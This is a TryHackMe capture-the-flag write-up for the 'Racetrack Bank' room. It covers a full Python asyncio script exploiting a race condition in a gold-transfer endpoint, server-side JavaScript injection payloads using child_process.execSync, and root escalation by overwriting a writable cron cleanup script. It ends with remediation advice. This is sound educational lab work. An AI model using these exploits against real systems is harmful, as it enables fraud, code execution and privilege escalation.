# Racetrack Bank - TryHackMe Write-up

**Room:** Racetrack Bank  
**Platform:** TryHackMe  
**Difficulty:** Medium/Hard  
**Type:** Web / Race Condition / Server-Side JavaScript Injection / Privilege Escalation  
**Status:** Completed  

---

## Disclaimer

This write-up is for educational purposes only and was completed in a legal lab environment on TryHackMe.

The goal is to document the methodology, exploitation path, and lessons learned without exposing real-world systems.

---

## Room Overview

Racetrack Bank is a web-focused TryHackMe challenge built around a vulnerable banking application.

The main attack path was:

```text
Recon -> Web Enumeration -> Account Creation/Login -> Race Condition
-> Premium Account -> Calculator Injection -> User Flag
-> Writable Cleanup Script -> Root Flag
````

The application initially exposes a simple banking interface where users can create accounts, log in, give gold to other users, and purchase premium features.

The intended path relies on abusing a race condition in the gold transfer feature to generate enough gold to buy premium access. After that, a vulnerable calculator feature allows server-side JavaScript execution.

---

## Reconnaissance

I started with a full TCP scan using Nmap:

```bash
sudo nmap -sC -sV -O -p- <TARGET_IP>
```

### Nmap Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Only two ports were open:

* `22/tcp` - SSH
* `80/tcp` - HTTP

The web server was running nginx, but the HTTP headers also revealed that the backend was powered by Express:

```text
X-Powered-By: Express
```

---

## Web Enumeration

Visiting the web application revealed the Racetrack Bank homepage.

The available public pages were:

```text
/
login.html
create.html
```

I downloaded and inspected the HTML pages:

```bash
curl -s http://<TARGET_IP>/ -o web/index.html
curl -s http://<TARGET_IP>/login.html -o web/login.html
curl -s http://<TARGET_IP>/create.html -o web/create.html
```

Useful routes were discovered from the HTML source:

```text
/api/create
/api/login
```

After logging in, more application pages became available:

```text
/home.html
/giving.html
/purchase.html
/premiumfeatures.html
/api/logout
```

The most interesting page was `giving.html`, which contained the gold transfer form:

```html
<form action="/api/givegold" method="POST">
    <input type="text" name="user">
    <input type="number" name="amount">
</form>
```

The purchase page contained the premium purchase endpoint:

```html
<form action="/api/buypremium" method="POST">
    <input type="submit" value="Buy">
</form>
```

---

## Authentication

I created and logged into test accounts using `curl`.

Example login request:

```bash
curl -s -i -c cookies.txt -b cookies.txt \
-X POST "http://<TARGET_IP>/api/login" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "username=<USERNAME>" \
--data-urlencode "password=<PASSWORD>"
```

A successful login returned:

```text
HTTP/1.1 302 Found
Location: /home.html
```

---

## Race Condition in Gold Transfer

The application gives each new user a small amount of gold.

The premium account costs **10,000 gold**, so the normal amount is not enough to purchase it.

The vulnerable endpoint was:

```text
POST /api/givegold
```

With parameters:

```text
user=<receiver>
amount=<gold_amount>
```

At first, I tested transferring `1` gold many times in parallel. This confirmed the race condition, but the gain was too slow.

The better approach was to transfer the sender's **full current balance** in parallel to another account.

Because the server processed multiple requests before properly updating the sender's balance, several transfers succeeded at the same time.

This caused the receiver's balance to multiply quickly.

---

## Exploiting the Race Condition

I used two accounts:

```text
Account A: ryn
Account B: dydy
```

The logic was:

1. Check which account has the most gold.
2. Send that full amount to the other account using many parallel requests.
3. Repeat until one account has more than 10,000 gold.
4. Buy premium.

### Exploit Script

```python
#!/usr/bin/env python3
import asyncio
import http.client
import re
import urllib.parse
from http.cookies import SimpleCookie

IP = "<TARGET_IP>"

USER_A = "ryn"
PASS_A = "a"

USER_B = "dydy"
PASS_B = "a"

GOAL = 10000
REQS = 250
CONCURRENCY = 250

def post(ip, path, data, cookie=None, timeout=8):
    body = urllib.parse.urlencode(data)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
    }

    if cookie:
        headers["Cookie"] = cookie

    conn = http.client.HTTPConnection(ip, 80, timeout=timeout)
    conn.request("POST", path, body, headers)

    res = conn.getresponse()
    raw = res.read().decode(errors="ignore")
    headers_list = res.getheaders()
    conn.close()

    return res.status, headers_list, raw

def get(ip, path, cookie=None, timeout=8):
    headers = {"Connection": "close"}

    if cookie:
        headers["Cookie"] = cookie

    conn = http.client.HTTPConnection(ip, 80, timeout=timeout)
    conn.request("GET", path, headers=headers)

    res = conn.getresponse()
    raw = res.read().decode(errors="ignore")
    headers_list = res.getheaders()
    conn.close()

    return res.status, headers_list, raw

def extract_cookie(headers):
    for key, value in headers:
        if key.lower() == "set-cookie" and "connect.sid" in value:
            parsed = SimpleCookie()
            parsed.load(value)

            if "connect.sid" in parsed:
                return "connect.sid=" + parsed["connect.sid"].value

    return None

def login(username, password):
    status, headers, body = post(
        IP,
        "/api/login",
        {
            "username": username,
            "password": password,
        },
    )

    location = next((v for k, v in headers if k.lower() == "location"), "")
    cookie = extract_cookie(headers)

    if not cookie or "/home.html" not in location:
        raise SystemExit(f"[!] Login failed for {username}: status={status}, location={location}")

    return cookie

def get_gold(cookie):
    status, headers, html = get(IP, "/home.html", cookie)

    match = re.search(r"Gold:\s*([0-9]+)", html, re.I)

    if not match:
        raise SystemExit("[!] Could not parse gold amount")

    return int(match.group(1))

def build_request(cookie, target_user, amount):
    body = urllib.parse.urlencode(
        {
            "user": target_user,
            "amount": str(amount),
        }
    )

    request = (
        f"POST /api/givegold HTTP/1.1\r\n"
        f"Host: {IP}\r\n"
        f"Cookie: {cookie}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    ).encode()

    return request

async def hit(raw_request, semaphore):
    async with semaphore:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(IP, 80),
                timeout=2,
            )

            writer.write(raw_request)
            await asyncio.wait_for(writer.drain(), timeout=2)

            response = await asyncio.wait_for(reader.read(128), timeout=5)

            writer.close()

            try:
                await writer.wait_closed()
            except Exception:
                pass

            if b"302" in response:
                return 302

            return "OTHER"

        except Exception:
            return "ERR"

async def burst(sender_cookie, receiver_user, amount):
    semaphore = asyncio.Semaphore(CONCURRENCY)
    raw_request = build_request(sender_cookie, receiver_user, amount)

    tasks = [
        hit(raw_request, semaphore)
        for _ in range(REQS)
    ]

    results = {}

    for task in asyncio.as_completed(tasks):
        result = await task
        results[result] = results.get(result, 0) + 1

    return results

def buy_premium(cookie):
    status, headers, body = post(IP, "/api/buypremium", {}, cookie)

    location = next((v for k, v in headers if k.lower() == "location"), "")

    print(f"[+] Buy premium response: status={status}, location={location}")

def get_premium_page(cookie):
    status, headers, html = get(IP, "/premiumfeatures.html", cookie)

    with open("premium.html", "w", encoding="utf-8") as file:
        file.write(html)

    print("[+] Premium page saved to premium.html")

async def main():
    cookie_a = login(USER_A, PASS_A)
    cookie_b = login(USER_B, PASS_B)

    for round_number in range(1, 20):
        gold_a = get_gold(cookie_a)
        gold_b = get_gold(cookie_b)

        print(f"\n[ROUND {round_number}] {USER_A}={gold_a} gold | {USER_B}={gold_b} gold")

        if gold_a >= GOAL:
            print(f"[+] {USER_A} reached the goal")
            buy_premium(cookie_a)
            get_premium_page(cookie_a)
            return

        if gold_b >= GOAL:
            print(f"[+] {USER_B} reached the goal")
            buy_premium(cookie_b)
            get_premium_page(cookie_b)
            return

        if gold_a >= gold_b and gold_a > 0:
            print(f"[+] Sending {gold_a} gold from {USER_A} to {USER_B}")
            results = await burst(cookie_a, USER_B, gold_a)
            print("[+] Results:", results)

        elif gold_b > 0:
            print(f"[+] Sending {gold_b} gold from {USER_B} to {USER_A}")
            results = await burst(cookie_b, USER_A, gold_b)
            print("[+] Results:", results)

        else:
            print("[!] Both accounts have 0 gold")
            return

        await asyncio.sleep(1)

    print("[!] Maximum rounds reached")

asyncio.run(main())
```

Running the script successfully abused the race condition:

```text
[ROUND 1] ryn=6063 gold | dydy=0 gold
[+] Sending 6063 gold from ryn to dydy
[+] Results: {302: 250}

[ROUND 2] ryn=0 gold | dydy=163701 gold
[+] dydy reached the goal
[+] Buy premium response: status=302, location=/purchase.html?success=Success!
```

The receiver now had far more than the required 10,000 gold.

---

## Premium Features

After buying premium, the premium page revealed a calculator feature:

```html
<form action="/api/calculate" method="POST">
    <input type="text" name="calculation">
</form>
```

The page said:

```text
Type in calculations, for example 1+1, and it will tell you the answer!
```

This looked suspicious because the backend was Express/Node.js.

---

## Server-Side JavaScript Injection

I tested a basic JavaScript expression:

```js
1+1
```

Then I tested whether server-side objects were accessible:

```js
process.cwd()
```

The calculator returned:

```text
/home/brian/website
```

This confirmed server-side JavaScript execution.

Next, I tested command execution:

```js
require("child_process").execSync("id").toString()
```

From there, I could execute system commands as the web application user.

---

## User Flag

I enumerated the home directory:

```js
require("child_process").execSync("ls -la /home/brian").toString()
```

Then I read the user flag:

```js
require("child_process").execSync("cat /home/brian/user.txt").toString()
```

The user flag was found successfully.

```text
THM{REDACTED}
```

---

## Privilege Escalation

I continued enumerating from the command injection.

The interesting directory was:

```text
/home/brian/cleanup
```

I inspected it:

```js
require("child_process").execSync("ls -la /home/brian/cleanup && cat /home/brian/cleanup/cleanupscript.sh").toString()
```

The cleanup script was writable by the current user and appeared to be executed periodically with elevated privileges.

This made it possible to modify the script and make it copy the root flag to a readable location.

I replaced the cleanup script with:

```bash
#!/bin/bash
cat /root/root.txt > /tmp/root.txt
chmod 644 /tmp/root.txt
```

Using the calculator injection:

```js
require("child_process").execSync("printf '#!/bin/bash\ncat /root/root.txt > /tmp/root.txt\nchmod 644 /tmp/root.txt\n' > /home/brian/cleanup/cleanupscript.sh; chmod +x /home/brian/cleanup/cleanupscript.sh").toString()
```

After waiting for the scheduled task to execute, I read the copied flag:

```js
require("child_process").execSync("cat /tmp/root.txt").toString()
```

Root flag obtained:

```text
THM{REDACTED}
```

---

## Attack Path Summary

```text
1. Nmap found SSH and HTTP.
2. Web app was running Express behind nginx.
3. Created/logged into bank accounts.
4. Found /api/givegold endpoint.
5. Abused race condition in gold transfer.
6. Used two accounts to multiply gold quickly.
7. Bought premium account.
8. Found premium calculator feature.
9. Confirmed server-side JavaScript injection with process.cwd().
10. Used child_process.execSync() for command execution.
11. Read user.txt.
12. Found writable cleanup script.
13. Modified cleanup script to copy /root/root.txt.
14. Read root flag from /tmp/root.txt.
```

---

## Key Vulnerabilities

### Race Condition

The `/api/givegold` endpoint did not safely handle concurrent transfers.

Multiple parallel requests could pass the balance check before the sender's balance was updated.

This allowed gold duplication.

### Server-Side JavaScript Injection

The calculator likely evaluated user input directly using a dangerous function such as `eval()`.

This allowed access to Node.js objects such as:

```js
process
require
child_process
```

### Insecure Scheduled Script

A script writable by the low-privileged user was executed by a privileged process.

This allowed privilege escalation by modifying the script contents.

---

## Lessons Learned

This room highlights several important security concepts:

* Race conditions can cause serious business logic flaws.
* Balance updates and transfers should be atomic.
* Financial operations should use database transactions and row locking.
* Never evaluate user input directly.
* Node.js applications should avoid exposing dangerous primitives like `eval()`.
* Privileged scheduled tasks should never execute scripts writable by unprivileged users.
* File permissions are critical for privilege separation.

---

## Remediation Ideas

To secure this application:

1. Use database transactions for gold transfers.
2. Lock sender and receiver rows during balance updates.
3. Validate transfer amounts server-side.
4. Reject negative, zero, and non-integer amounts.
5. Avoid `eval()` or any equivalent dynamic execution.
6. Run the web service as a restricted user.
7. Ensure root cron jobs never execute user-writable files.
8. Apply least privilege to all filesystem paths.

---

## Final Result

```text
User flag: obtained
Root flag: obtained
Machine: completed
```

---
